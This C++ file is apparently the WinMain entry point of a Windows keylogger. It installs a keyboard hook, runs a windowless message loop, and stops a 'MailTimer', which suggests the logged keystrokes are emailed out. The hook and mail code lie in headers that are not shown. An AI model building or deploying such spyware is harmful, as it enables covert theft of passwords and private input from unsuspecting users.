#include <iostream>
#include <windows.h>
#include "IO.h"
#include "KeyHook.h"

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
    MSG Msg;

    InstallHook();

    while(GetMessage(&Msg, nullptr, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();

    return 0;
}